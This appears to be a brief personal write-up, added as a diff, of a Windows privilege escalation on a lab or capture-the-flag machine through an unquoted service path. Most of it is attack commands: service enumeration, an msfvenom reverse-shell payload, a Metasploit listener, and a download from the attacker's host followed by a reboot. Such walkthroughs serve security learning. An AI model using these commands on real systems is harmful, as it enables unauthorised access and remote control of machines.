@@ -1,0 +1,41 @@
+outside of other basic enumeration commands, the one that i used for this privesc was:
+
+`wmic service get name,displayname,pathname,startmode`
+
+then:
+
+`sc qc vulnservice`
+
+i noticed service.exe in an unquoted path, with START_TYPE=AUTO
+
+command generating my payload:
+
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.112.50 LPORT=9999 -f exe -o Development.exe`
+
+listener:
+
+`msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
+payload => windows/x64/shell_reverse_tcp
+msf6 exploit(multi/handler) > set lport 9999
+lport => 9999
+msf6 exploit(multi/handler) > set lhost tun1
+lhost => tun1
+msf6 exploit(multi/handler) > show options`
+
+hosting the payload:
+
+`python -m http.server 80`
+
+downloading the payload using wget in powershell:
+
+`wget [http://10.18.112.50/Devservice.exe](http://10.18.112.50/Devservice.exe)  -o Devservice.exe`
+
+restarting the box:
+
+`shutdown /r /t 0`
+
+pops a shell in the listener, due to START_TYPE=AUTO
+
+alternative way to check for write permissions:
+
+`type nul >>file & copy file +,,`
